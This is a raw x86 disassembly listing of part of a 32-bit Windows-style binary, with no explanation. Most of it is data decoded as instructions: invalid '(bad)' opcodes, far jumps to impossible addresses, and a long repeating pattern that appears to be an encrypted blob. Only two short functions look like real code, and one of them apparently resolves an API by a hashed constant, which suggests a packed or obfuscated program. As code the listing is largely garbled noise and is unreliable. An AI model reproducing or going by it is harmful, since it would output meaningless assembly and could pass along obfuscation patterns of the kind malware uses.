  422cee:	and    DWORD PTR [ecx+ecx*1],esp
  422cf1:	mov    WORD PTR [ecx+0x22e7c131],es
  422cf7:	cvtps2pi mm3,QWORD PTR [edi+0x78a6310]
  422cfe:	mov    bl,0xee
  422d00:	pop    edx
  422d01:	xor    DWORD PTR [ebx-0x27],edi
  422d04:	mov    ah,0x6d
  422d06:	pushf  
  422d07:	dec    edx
  422d08:	adc    eax,0xec08d062
  422d0d:	inc    esp
  422d0e:	(bad)
  422d11:	in     al,dx
  422d12:	jne    0x422d4b
  422d14:	(bad)  
  422d15:	nop
  422d16:	push   ds
  422d17:	popa   
  422d18:	test   eax,0x5d19a62f
  422d1d:	outs   dx,DWORD PTR ds:[esi]
  422d1e:	fucompp 
  422d20:	fs fst st(6)
  422d23:	inc    edx
  422d24:	adc    dh,BYTE PTR [edx]
  422d26:	jge    0x422d27
  422d28:	mov    dh,0x44
  422d2a:	sub    eax,0xb366d33d
  422d2f:	xor    eax,0x950d968b
  422d34:	sti    
  422d35:	lock dec ebx
  422d37:	or     esi,DWORD PTR [ebx+ecx*1-0x46]
  422d3b:	jo     0x422d0b
  422d3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d3e:	pop    edi
  422d3f:	cmovs  edi,DWORD PTR [ebx-0x7352d8f8]
  422d46:	and    bh,BYTE PTR [ecx-0x7d]
  422d49:	jmp    0x422d92
  422d4b:	stos   DWORD PTR es:[edi],eax
  422d4c:	add    BYTE PTR [edi+0x54],bh
  422d4f:	sub    bh,BYTE PTR [eax+esi*2+0x411668f6]
  422d56:	xor    ecx,0x54b4866c
  422d5c:	dec    eax
  422d5d:	f2xm1  
  422d5f:	cmp    BYTE PTR [edi],bh
  422d61:	mov    cl,0x29
  422d63:	aas    
  422d64:	xchg   ebp,eax
  422d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d66:	adc    ebp,DWORD PTR [ebx+eiz*2+0x1]
  422d6a:	pop    eax
  422d6b:	xor    DWORD PTR [ebx+0x3d],ecx
  422d6e:	mov    BYTE PTR [ebp-0x1a],al
  422d71:	pop    ds
  422d72:	mov    dh,0x17
  422d74:	mov    edi,0x240d7a4b
  422d79:	rol    esp,cl
  422d7b:	ret    
  422d7c:	or     ecx,ebx
  422d7e:	fwait
  422d7f:	(bad)  
  422d80:	dec    eax
  422d81:	add    eax,DWORD PTR [esp+0x52]
  422d85:	dec    edx
  422d86:	cmp    DWORD PTR [ebp+0x2d2e60ef],esp
  422d8c:	push   ecx
  422d8d:	idiv   BYTE PTR ds:0x41328002
  422d93:	mov    cs,ecx
  422d95:	push   0xa1e67909
  422d9a:	jl     0x422d3c
  422d9c:	push   cs
  422d9d:	imul   ebx,DWORD PTR [edx-0x576624f4],0xbd55a235
  422da7:	pop    ecx
  422da8:	jb     0x422de1
  422daa:	popf   
  422dab:	and    dh,BYTE PTR [edx+0x56c795e]
  422db1:	mov    ebp,0x461cf1d9
  422db6:	adc    BYTE PTR [ecx+0x68010e16],0x86
  422dbd:	loope  0x422e0e
  422dbf:	pop    es
  422dc0:	inc    edx
  422dc1:	jle    0x422d8c
  422dc3:	scas   eax,DWORD PTR es:[edi]
  422dc4:	push   edi
  422dc5:	dec    esi
  422dc6:	and    bl,BYTE PTR es:[edx-0x10dbc042]
  422dcd:	(bad)  
  422dce:	js     0x422d5b
  422dd0:	mov    esi,0x720d0b32
  422dd5:	mov    ch,0xca
  422dd7:	mov    ebp,DWORD PTR [ebp+0x1d]
  422dda:	mov    BYTE PTR [ecx-0x58e442fd],ch
  422de0:	pop    ss
  422de1:	push   0xad244df7
  422de6:	call   FWORD PTR ds:0x18448acc
  422dec:	xlat   BYTE PTR ds:[ebx]
  422ded:	gs push 0x9554bda1
  422df3:	mov    edx,0x11e48f51
  422df8:	dec    eax
  422df9:	repz and bh,bl
  422dfc:	scas   al,BYTE PTR es:[edi]
  422dfd:	in     al,0x8e
  422dff:	das    
  422e00:	inc    ecx
  422e01:	je     0x422e3a
  422e03:	dec    ebp
  422e04:	mov    esi,0xd26a0fca
  422e09:	mov    dl,0x64
  422e0b:	call   0x87c0df7d
  422e10:	cmp    eax,0xa217a035
  422e15:	inc    ebx
  422e16:	mov    dl,BYTE PTR [ebx-0x1d2655e3]
  422e1c:	dec    esi
  422e1d:	adc    eax,0xbc17c99e
  422e22:	push   edi
  422e23:	xlat   BYTE PTR ds:[ebx]
  422e24:	xor    BYTE PTR [esi],bh
  422e26:	push   edx
  422e27:	scas   eax,DWORD PTR es:[edi]
  422e28:	lods   eax,DWORD PTR ds:[esi]
  422e29:	mov    bl,0xa1
  422e2b:	xchg   esp,eax
  422e2c:	mov    ebp,0x8a1ea177
  422e31:	push   0x28c07e02
  422e36:	jns    0x422ea2
  422e38:	jns    0x422e92
  422e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e3b:	jg     0x422e41
  422e3d:	push   edx
  422e3e:	(bad)  
  422e3f:	retf   
  422e40:	push   ebp
  422e41:	in     eax,0x3c
  422e43:	sbb    cl,al
  422e45:	or     al,0x66
  422e47:	jns    0x422eaa
  422e49:	div    BYTE PTR [ecx-0x6b1fe7fb]
  422e4f:	(bad)  
  422e50:	xor    eax,0xd72245de
  422e55:	lea    ebx,[ecx]
  422e57:	dec    ecx
  422e58:	loope  0x422ed8
  422e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e5b:	inc    edi
  422e5c:	sub    eax,0x7b1d52e4
  422e61:	jne    0x422ea8
  422e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e64:	inc    esp
  422e65:	jns    0x422e56
  422e67:	xchg   edi,eax
  422e68:	call   0xc5f5:0xef27f549
  422e6f:	dec    ebx
  422e70:	xor    DWORD PTR [edi+0x59],ecx
  422e73:	icebp  
  422e74:	(bad)  
  422e75:	pop    edi
  422e76:	mov    DWORD PTR [ecx-0x7e3a5587],edi
  422e7c:	(bad)  
  422e7d:	hlt    
  422e7e:	out    dx,eax
  422e7f:	jl     0x422e0a
  422e81:	paddsw mm6,QWORD PTR [esi-0x38342f3]
  422e88:	(bad)  
  422e89:	mov    edi,0x9b0b5147
  422e8e:	daa    
  422e8f:	cli    
  422e90:	mov    bh,0x35
  422e92:	jbe    0x422e87
  422e94:	pop    edi
  422e95:	lods   ax,WORD PTR ds:[esi]
  422e97:	test   al,0x7c
  422e99:	xchg   esp,eax
  422e9a:	dec    esi
  422e9b:	das    
  422e9c:	pop    ecx
  422e9d:	rcl    esi,1
  422e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ea0:	je     0x422e6e
  422ea2:	loopne 0x422e9f
  422ea4:	sub    BYTE PTR [eax+0x25],dh
  422ea7:	jmp    0xde73:0xe66cce39
  422eae:	xor    DWORD PTR [edx-0x2e0462c7],eax
  422eb4:	in     al,dx
  422eb5:	vunpcklpd ymm2,ymm6,YMMWORD PTR [edx]
  422eb9:	and    esp,DWORD PTR [edi]
  422ebb:	icebp  
  422ebc:	into   
  422ebd:	pop    ecx
  422ebe:	popa   
  422ebf:	rol    eax,0xe3
  422ec2:	test   dl,bl
  422ec4:	rol    edi,1
  422ec6:	pop    ebp
  422ec7:	or     eax,0x33420bdd
  422ecc:	mov    edx,?
  422ece:	ret    
  422ecf:	fwait
  422ed0:	(bad)  
  422ed1:	stos   DWORD PTR es:[edi],eax
  422ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed3:	popf   
  422ed4:	jnp    0x422f13
  422ed6:	addr16 pop esp
  422ed8:	or     BYTE PTR ds:0x5b39f61d,ch
  422ede:	and    al,0x65
  422ee0:	add    BYTE PTR es:[edi+0x68],cl
  422ee4:	iret   
  422ee5:	cli    
  422ee6:	xchg   ebx,eax
  422ee7:	stos   DWORD PTR es:[edi],eax
  422ee8:	or     DWORD PTR [edi+0x7316e534],edx
  422eee:	hlt    
  422eef:	pop    es
  422ef0:	xor    BYTE PTR [ecx+ecx*2-0x7c],dh
  422ef4:	bound  ecx,QWORD PTR [edx+0x715ff3db]
  422efa:	and    ebx,DWORD PTR [eax+0x49329ef1]
  422f00:	xor    BYTE PTR [ebx+0x47],ah
  422f03:	sub    DWORD PTR [ebx+0x1d2ba9ab],ebx
  422f09:	or     al,0x49
  422f0b:	xchg   al,al
  422f0d:	dec    edi
  422f0e:	imul   eax,DWORD PTR [edi],0xdca91feb
  422f14:	jmp    0x41d4:0xdfc92e09
  422f1b:	sar    BYTE PTR [edi],0xf8
  422f1e:	(bad)  
  422f1f:	sbb    esp,eax
  422f21:	mov    ds,esp
  422f23:	clc    
  422f24:	dec    esp
  422f25:	push   ebp
  422f26:	iret   
  422f27:	add    eax,edi
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x435752de
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	(bad)  
  422fd3:	fdivrp st(2),st
  422fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fd6:	xchg   ah,ch
  422fd8:	mov    edi,0x2c13d9
  422fdd:	push   ecx
  422fde:	lahf   
  422fdf:	mov    bh,0x6c
  422fe1:	test   al,0x35
  422fe3:	ds out dx,eax
  422fe5:	mov    edi,0x2813d9
  422fea:	push   ecx
  422feb:	fisttp WORD PTR [eax-0x6d]
  422fee:	test   al,0x35
  422ff0:	xchg   bh,ch
  422ff2:	mov    edi,0x2813d9
  422ff7:	push   ecx
  422ff8:	lahf   
  422ff9:	dec    eax
  422ffa:	xchg   ebx,eax
  422ffb:	test   al,0x35
  422ffd:	xchg   bh,ch
  422fff:	mov    edi,0x2813d9
  423004:	push   ecx
  423005:	lahf   
  423006:	dec    eax
  423007:	xchg   ebx,eax
  423008:	test   al,0x35
  42300a:	xchg   bh,ch
  42300c:	mov    edi,0xd013d9
  423011:	push   ecx
  423012:	lahf   
  423013:	inc    esi
  423014:	mov    WORD PTR [edx],ss
  423016:	cmp    eax,DWORD PTR [esi+0x3214b65b]
  42301c:	nop
  42301d:	add    DWORD PTR ds:0xc0c76952,ebx
  423023:	pop    esp
  423024:	cmc    
  423025:	iret   
  423026:	iret   
  423027:	stos   DWORD PTR es:[edi],eax
  423028:	jl     0x423079
  42302a:	jb     0x42305c
  42302c:	repnz push 0xe85bc9f0
  423032:	or     bl,0xf9
  423035:	jno    0x423084
  423037:	and    BYTE PTR [ebx],ah
  423039:	jmp    0xaba6:0x5bc1b326
  423040:	lock mov dh,BYTE PTR [ebx]
  423043:	inc    ebp
  423044:	outs   dx,DWORD PTR ds:[esi]
  423045:	xor    eax,0xa59e66fa
  42304a:	aas    
  42304b:	mov    ds:0x13d9bfef,al
  423050:	sub    BYTE PTR [eax],al
  423052:	push   ecx
  423053:	cwde   
  423054:	shr    DWORD PTR [edi-0xf],1
  423057:	jbe    0x4230d7
  423059:	jge    0x423010
  42305b:	call   0xda67:0x120abaeb
  423062:	cdq    
  423063:	lock push eax
  423065:	mov    ah,ch
  423067:	loopne 0x42308a
  423069:	and    DWORD PTR [edx],0x42a73458
  42306f:	push   ecx
  423070:	push   eax
  423071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423072:	mov    WORD PTR [edi+0x4019e0da],?
  423078:	clc    
  423079:	ret    
  42307a:	xchg   ebp,eax
  42307b:	fs sbb eax,0x17c03f91
  423081:	sub    eax,0x11a859d3
  423086:	pop    ebx
  423087:	aad    0xb0
  423089:	add    DWORD PTR [edx-0x4a11f981],esp
  42308f:	sub    ebx,0x67120aba
  423095:	fistp  DWORD PTR [ecx-0x1aeb3380]
  42309b:	add    BYTE PTR [ecx],al
  42309d:	xchg   ebx,eax
  42309e:	and    cl,BYTE PTR [ebp-0x57]
  4230a1:	or     eax,0x8cdcb42
  4230a6:	mov    edi,fs
  4230a8:	inc    edi
  4230a9:	dec    ebx
  4230aa:	sbb    DWORD PTR [eax+0x65],esi
  4230ad:	pop    ecx
  4230ae:	xchg   ebp,eax
  4230af:	or     ch,BYTE PTR [ebx+0x3a]
  4230b2:	aas    
  4230b3:	fimul  WORD PTR [edx-0x2fae2c50]
  4230b9:	xchg   edx,eax
  4230ba:	pop    ebx
  4230bb:	int    0x21
  4230bd:	lock shl BYTE PTR [esi+0x7e],0x7d
  4230c2:	mov    ch,0xd9
  4230c4:	adc    ebp,DWORD PTR [eax]
  4230c6:	add    BYTE PTR [ecx-0x61],dl
  4230c9:	dec    eax
  4230ca:	xchg   ebx,eax
  4230cb:	clc    
  4230cc:	jo     0x423054
  4230ce:	out    dx,eax
  4230cf:	repz fcom DWORD PTR [ecx]
  4230d2:	sub    ah,ch
  4230d4:	mov    dl,0xc0
  4230d6:	pop    es
  4230d7:	xchg   ebx,eax
  4230d8:	test   al,0x35
  4230da:	xchg   bh,ch
  4230dc:	mov    edi,0xc813d9
  4230e1:	push   edx
  4230e2:	sahf   
  4230e3:	inc    ebx
  4230e4:	xchg   edx,eax
  4230e5:	mov    ds:0xbb038635,al
  4230ea:	fst    DWORD PTR [ebx]
  4230ec:	sub    al,0x6
  4230ee:	push   ecx
  4230ef:	lahf   
  4230f0:	dec    eax
  4230f1:	xchg   ebx,eax
  4230f2:	test   al,0x34
  4230f4:	cmp    ebp,edi
  4230f6:	mov    edi,0x2803d9
  4230fb:	push   ecx
  4230fc:	lahf   
  4230fd:	dec    ebp
  4230fe:	xchg   ebx,eax
  4230ff:	test   al,0x35
  423101:	(bad)  
  423102:	out    dx,eax
  423103:	mov    edi,0x2813c9
  423108:	push   ebx
  423109:	lahf   
  42310a:	dec    eax
  42310b:	xchg   esi,eax
  42310c:	test   al,0x34
  42310e:	xchg   bh,ch
  423110:	mov    edi,0x2d13d9
  423115:	push   eax
  423116:	lahf   
  423117:	dec    eax
  423118:	xchg   ebx,eax
  423119:	test   al,0x35
  42311b:	xchg   BYTE PTR [edi-0x4c],ch
  42311e:	fst    DWORD PTR [ebx]
  423120:	sub    al,0x0
  423122:	push   ecx
  423123:	and    bh,BYTE PTR [ecx-0x6a]
  423126:	test   al,0x37
  423128:	xchg   bh,ch
  42312a:	aas    
  42312b:	fst    DWORD PTR [ebx]
  42312d:	cmp    BYTE PTR [eax],al
  42312f:	push   ecx
  423130:	(bad)
  423134:	xor    eax,0xc9bfef96
  423139:	adc    ebp,DWORD PTR [eax]
  42313b:	add    BYTE PTR [ecx-0x61],dl
  42313e:	dec    eax
  42313f:	sub    DWORD PTR [eax-0x401079cb],0xffffffd9
  423146:	adc    ebp,DWORD PTR [eax]
  423148:	add    BYTE PTR [ecx-0x61],dl
  42314b:	int3   
  42314c:	std    
  42314d:	mov    ds:0xbfecef35,eax
  423152:	fst    DWORD PTR [ebx]
  423154:	sbb    BYTE PTR [ebx],cl
  423156:	push   ecx
  423157:	push   eax
  423158:	jne    0x4230ed
  42315a:	test   al,0x35
  42315c:	xchg   bh,ch
  42315e:	mov    edi,0x2813d9
  423163:	push   ecx
  423164:	lahf   
  423165:	dec    eax
  423166:	xchg   ebx,eax
  423167:	test   al,0x35
  423169:	xchg   bh,ch
  42316b:	mov    edi,0x2813d9
  423170:	push   ecx
  423171:	lahf   
  423172:	dec    eax
  423173:	xchg   ebx,eax
  423174:	test   al,0x35
  423176:	xchg   bh,ch
  423178:	mov    edi,0x2813d9
  42317d:	push   ecx
  42317e:	lahf   
  42317f:	dec    eax
  423180:	xchg   ebx,eax
  423181:	test   al,0x35
  423183:	xchg   bh,ch
  423185:	mov    edi,0x2813d9
  42318a:	push   ecx
  42318b:	lahf   
  42318c:	dec    eax
  42318d:	xchg   ebx,eax
  42318e:	test   al,0x35
  423190:	xchg   bh,ch
  423192:	mov    edi,0x2813d9
  423197:	push   ecx
  423198:	lahf   
  423199:	dec    eax
  42319a:	xchg   ebx,eax
  42319b:	test   al,0x35
  42319d:	xchg   bh,ch
  42319f:	mov    edi,0x2813d9
  4231a4:	push   ecx
  4231a5:	lahf   
  4231a6:	dec    eax
  4231a7:	xchg   ebx,eax
  4231a8:	test   al,0x35
  4231aa:	xchg   bh,ch
  4231ac:	mov    edi,0x2813d9
  4231b1:	push   ecx
  4231b2:	lahf   
  4231b3:	dec    eax
  4231b4:	xchg   ebx,eax
  4231b5:	test   al,0x35
  4231b7:	xchg   bh,ch
  4231b9:	mov    edi,0x2813d9
  4231be:	push   ecx
  4231bf:	lahf   
  4231c0:	dec    eax
  4231c1:	xchg   ebx,eax
  4231c2:	test   al,0x1b
  4231c4:	repnz mov al,bh
  4231c7:	lods   eax,DWORD PTR ds:[esi]
  4231c8:	adc    ebp,DWORD PTR [eax]
  4231ca:	add    BYTE PTR [ecx-0x41],dl
  4231cd:	inc    ebx
  4231ce:	xchg   ebx,eax
  4231cf:	test   al,0x25
  4231d1:	xchg   bh,ch
  4231d3:	mov    edi,0x2817e3
  4231d8:	push   ebp
  4231d9:	lahf   
  4231da:	dec    eax
  4231db:	ret    
  4231dc:	in     eax,dx
  4231dd:	jbe    0x423193
  4231df:	mov    ebx,0x2813d9f0
  4231e4:	add    BYTE PTR [ecx-0x61],dl
  4231e7:	push   0xa8d5a893
  4231ec:	popf   
  4231ed:	int3   
  4231ee:	stos   DWORD PTR es:[edi],eax
  4231ef:	jo     0x423219
  4231f1:	add    BYTE PTR [ecx-0x61],dl
  4231f4:	sbb    BYTE PTR [ebx-0x1b49ca58],dl
  4231fa:	mov    edi,0x2843d9
  4231ff:	push   ecx
  423200:	mov    eax,ds:0x35a8934c
  423205:	xchg   bh,ch
  423207:	mov    edi,0x2813d9
  42320c:	push   ecx
  42320d:	lahf   
  42320e:	dec    eax
  42320f:	mov    bl,0xa8
  423211:	xor    eax,0xd9bfef66
  423216:	adc    ebp,DWORD PTR [eax]
  423218:	add    BYTE PTR [ecx-0x61],dl
  42321b:	dec    eax
  42321c:	xchg   ebx,eax
  42321d:	test   al,0x35
  42321f:	xchg   bh,ch
  423221:	mov    edi,0x2813d9
  423226:	push   ecx
  423227:	lahf   
  423228:	dec    eax
  423229:	xchg   ebx,eax
  42322a:	test   al,0x35
  42322c:	xchg   bh,ch
  42322e:	mov    edi,0x2813d9
  423233:	push   ecx
  423234:	lahf   
  423235:	dec    eax
  423236:	xchg   ebx,eax
  423237:	test   al,0x35
  423239:	xchg   bh,ch
  42323b:	mov    edi,0x2813d9
  423240:	push   ecx
  423241:	lahf   
  423242:	dec    eax
  423243:	xchg   ebx,eax
  423244:	test   al,0x35
  423246:	xchg   bh,ch
  423248:	mov    edi,0x2813d9
  42324d:	push   ecx
  42324e:	lahf   
  42324f:	dec    eax
  423250:	xchg   ebx,eax
  423251:	test   al,0x35
  423253:	xchg   bh,ch
  423255:	mov    edi,0x2813d9
  42325a:	push   ecx
  42325b:	lahf   
  42325c:	dec    eax
  42325d:	xchg   ebx,eax
  42325e:	test   al,0x35
  423260:	xchg   bh,ch
  423262:	mov    edi,0x2813d9
  423267:	push   ecx
  423268:	lahf   
  423269:	dec    eax
  42326a:	xchg   ebx,eax
  42326b:	test   al,0x35
  42326d:	xchg   bh,ch
  42326f:	mov    edi,0x2813d9
  423274:	push   ecx
  423275:	lahf   
  423276:	dec    eax
  423277:	xchg   ebx,eax
  423278:	test   al,0x35
  42327a:	xchg   bh,ch
  42327c:	mov    edi,0x2813d9
  423281:	push   ecx
  423282:	lahf   
  423283:	dec    eax
  423284:	xchg   ebx,eax
  423285:	test   al,0x35
  423287:	xchg   bh,ch
  423289:	mov    edi,0x2813d9
  42328e:	push   ecx
  42328f:	lahf   
  423290:	dec    eax
  423291:	xchg   ebx,eax
  423292:	test   al,0x35
  423294:	xchg   bh,ch
  423296:	mov    edi,0x2813d9
  42329b:	push   ecx
  42329c:	lahf   
  42329d:	dec    eax
  42329e:	xchg   ebx,eax
  42329f:	test   al,0x35
  4232a1:	xchg   bh,ch
  4232a3:	mov    edi,0x2813d9
  4232a8:	push   ecx
  4232a9:	lahf   
  4232aa:	dec    eax
  4232ab:	xchg   ebx,eax
  4232ac:	test   al,0x35
  4232ae:	xchg   bh,ch
  4232b0:	mov    edi,0x2813d9
  4232b5:	push   ecx
  4232b6:	lahf   
  4232b7:	dec    eax
  4232b8:	xchg   ebx,eax
  4232b9:	test   al,0x35
  4232bb:	xchg   bh,ch
  4232bd:	mov    edi,0x2813d9
  4232c2:	push   ecx
  4232c3:	lahf   
  4232c4:	dec    eax
  4232c5:	xchg   ebx,eax
  4232c6:	test   al,0x35
  4232c8:	xchg   bh,ch
  4232ca:	mov    edi,0x2813d9
  4232cf:	push   ecx
  4232d0:	lahf   
  4232d1:	dec    eax
  4232d2:	xchg   ebx,eax
  4232d3:	test   al,0x35
  4232d5:	xchg   bh,ch
  4232d7:	mov    edi,0x2813d9
  4232dc:	push   ecx
  4232dd:	lahf   
  4232de:	dec    eax
  4232df:	xchg   ebx,eax
  4232e0:	test   al,0x35
  4232e2:	xchg   bh,ch
  4232e4:	mov    edi,0x2813d9
  4232e9:	push   ecx
  4232ea:	lahf   
  4232eb:	dec    eax
  4232ec:	xchg   ebx,eax
  4232ed:	test   al,0x35
  4232ef:	xchg   bh,ch
  4232f1:	mov    edi,0x2813d9
  4232f6:	push   ecx
  4232f7:	lahf   
  4232f8:	dec    eax
  4232f9:	xchg   ebx,eax
  4232fa:	test   al,0x35
  4232fc:	xchg   bh,ch
  4232fe:	mov    edi,0x2813d9
  423303:	push   ecx
  423304:	lahf   
  423305:	dec    eax
  423306:	xchg   ebx,eax
  423307:	test   al,0x35
  423309:	xchg   bh,ch
  42330b:	mov    edi,0x2813d9
  423310:	push   ecx
  423311:	lahf   
  423312:	dec    eax
  423313:	xchg   ebx,eax
  423314:	test   al,0x35
  423316:	xchg   bh,ch
  423318:	mov    edi,0x2813d9
  42331d:	push   ecx
  42331e:	lahf   
  42331f:	dec    eax
  423320:	xchg   ebx,eax
  423321:	test   al,0x35
  423323:	xchg   bh,ch
  423325:	mov    edi,0x2813d9
  42332a:	push   ecx
  42332b:	lahf   
  42332c:	dec    eax
  42332d:	xchg   ebx,eax
  42332e:	test   al,0x35
  423330:	xchg   bh,ch
  423332:	mov    edi,0x2813d9
  423337:	push   ecx
  423338:	lahf   
  423339:	dec    eax
  42333a:	xchg   ebx,eax
  42333b:	test   al,0x35
  42333d:	xchg   bh,ch
  42333f:	mov    edi,0x2813d9
  423344:	push   ecx
  423345:	lahf   
  423346:	dec    eax
  423347:	xchg   ebx,eax
  423348:	test   al,0x35
  42334a:	xchg   bh,ch
  42334c:	mov    edi,0x2813d9
  423351:	push   ecx
  423352:	lahf   
  423353:	dec    eax
  423354:	xchg   ebx,eax
  423355:	test   al,0x35
  423357:	xchg   bh,ch
  423359:	mov    edi,0x2813d9
  42335e:	push   ecx
  42335f:	lahf   
  423360:	dec    eax
  423361:	xchg   ebx,eax
  423362:	test   al,0x35
  423364:	xchg   bh,ch
  423366:	mov    edi,0x2813d9
  42336b:	push   ecx
  42336c:	lahf   
  42336d:	dec    eax
  42336e:	xchg   ebx,eax
  42336f:	test   al,0x35
  423371:	xchg   bh,ch
  423373:	mov    edi,0x2813d9
  423378:	push   ecx
  423379:	lahf   
  42337a:	dec    eax
  42337b:	xchg   ebx,eax
  42337c:	test   al,0x35
  42337e:	xchg   bh,ch
  423380:	mov    edi,0x2813d9
  423385:	push   ecx
  423386:	lahf   
  423387:	dec    eax
  423388:	xchg   ebx,eax
  423389:	test   al,0x35
  42338b:	xchg   bh,ch
  42338d:	mov    edi,0x2813d9
  423392:	push   ecx
  423393:	lahf   
  423394:	dec    eax
  423395:	xchg   ebx,eax
  423396:	test   al,0x35
  423398:	xchg   bh,ch
  42339a:	mov    edi,0x2813d9
  42339f:	push   ecx
  4233a0:	lahf   
  4233a1:	dec    eax
  4233a2:	xchg   ebx,eax
  4233a3:	test   al,0x35
  4233a5:	xchg   bh,ch
  4233a7:	mov    edi,0x2813d9
  4233ac:	push   ecx
  4233ad:	lahf   
  4233ae:	dec    eax
  4233af:	xchg   ebx,eax
  4233b0:	test   al,0x35
  4233b2:	xchg   bh,ch
  4233b4:	mov    edi,0x2813d9
  4233b9:	push   ecx
  4233ba:	lahf   
  4233bb:	dec    eax
  4233bc:	xchg   ebx,eax
  4233bd:	test   al,0x35
  4233bf:	xchg   bh,ch
  4233c1:	mov    edi,0x2813d9
  4233c6:	push   ecx
  4233c7:	lahf   
  4233c8:	dec    eax
  4233c9:	xchg   ebx,eax
  4233ca:	test   al,0x35
  4233cc:	xchg   bh,ch
  4233ce:	mov    edi,0x2813d9
  4233d3:	push   ss
  4233d4:	jno    0x423418
  4233d6:	xchg   ebx,eax
  4233d7:	xchg   DWORD PTR ds:0xd9bfff86,esi
  4233dd:	cmp    DWORD PTR [edx-0x4806df26],ecx
  4233e3:	mov    esi,0x2d6b236
  4233e8:	mov    DWORD PTR [ecx],esi
  4233ea:	add    BYTE PTR [ebp+edx*4-0x363311c9],bl
  4233f1:	mov    ebx,0xd2f93184
  4233f6:	cmp    eax,0x7fc6a999
  4233fb:	std    
  4233fc:	fsubr  DWORD PTR [ecx+edx*4-0x57a136fa]
  423403:	sti    
  423404:	adc    ecx,DWORD PTR [edi]
  423406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423407:	fxch   st(2)
  423409:	sbb    esi,edi
  42340b:	add    DWORD PTR [edi],eax
  42340d:	mov    ebx,0x7368ab32
  423412:	cmp    BYTE PTR [ebx+0x77],bl
  423415:	mov    fs,WORD PTR [edi+0x615909fa]
  42341b:	push   ebp
  42341c:	xchg   ebx,eax
  42341d:	push   ds
  42341e:	sahf   
  42341f:	jl     0x42341f
  423421:	addr16 out dx,eax
  423423:	test   DWORD PTR [edx],ecx
  423425:	stos   BYTE PTR es:[edi],al
  423426:	xchg   ebp,eax
  423427:	dec    edi
  423428:	jmp    0x423452
  42342a:	mov    al,ds:0x4c75342c
  42342f:	cs out 0x44,al
  423432:	xor    ebp,ebp
  423434:	shl    DWORD PTR [ebp+0x441e90b3],0xba
  42343b:	fist   DWORD PTR [edx-0x3db19300]
  423441:	mov    ebx,0xa58fdae5
  423446:	jmp    0x4233e6
  423448:	xchg   ecx,eax
  423449:	call   FWORD PTR [esi+0x64d1ebd8]
  42344f:	push   es
  423450:	outs   dx,DWORD PTR ds:[esi]
  423451:	xchg   edx,eax
  423452:	nop
  423453:	lock sub esi,ecx
  423456:	fwait
  423457:	mov    ds:0x64713618,eax
  42345c:	cmp    ch,cl
  42345e:	cli    
  42345f:	adc    al,0x5
  423461:	rol    DWORD PTR [ecx-0x1f36d242],cl
  423467:	or     edx,edi
  423469:	ins    BYTE PTR es:[edi],dx
  42346a:	jae    0x423406
  42346c:	mov    ebx,0x8245b902
  423472:	push   ecx
  423473:	clc    
  423474:	sbb    BYTE PTR [eax+0x6ee209a1],ah
  42347a:	int3   
  42347b:	ret    
  42347c:	out    dx,al
  42347d:	sbb    bl,BYTE PTR [eax]
  42347f:	or     eax,0x5ead07cb
  423484:	dec    eax
  423485:	ss out dx,al
  423487:	shl    edi,1
  423489:	mov    ds:0xc0c98311,al
  42348e:	sbb    ah,ch
  423490:	jmp    0x4234d7
  423492:	push   edi
  423493:	push   esp
  423494:	scas   al,BYTE PTR es:[edi]
  423495:	cwde   
  423496:	imul   eax,DWORD PTR [ecx],0xffffffbe
  423499:	call   0x7a71:0x3a8f9c2e
  4234a0:	mov    ah,0xf8
  4234a2:	aam    0x4f
  4234a4:	cmp    ch,BYTE PTR [edx+0x49]
  4234a7:	jo     0x423497
  4234a9:	mov    edx,0x70358ddb
  4234ae:	cwde   
  4234af:	outs   dx,DWORD PTR ds:[esi]
  4234b0:	inc    eax
  4234b1:	jge    0x423508
  4234b3:	call   0x7f1716b4
  4234b8:	xchg   edx,eax
  4234b9:	dec    ecx
  4234ba:	sub    bh,BYTE PTR [edx-0x69]
  4234bd:	aad    0x54
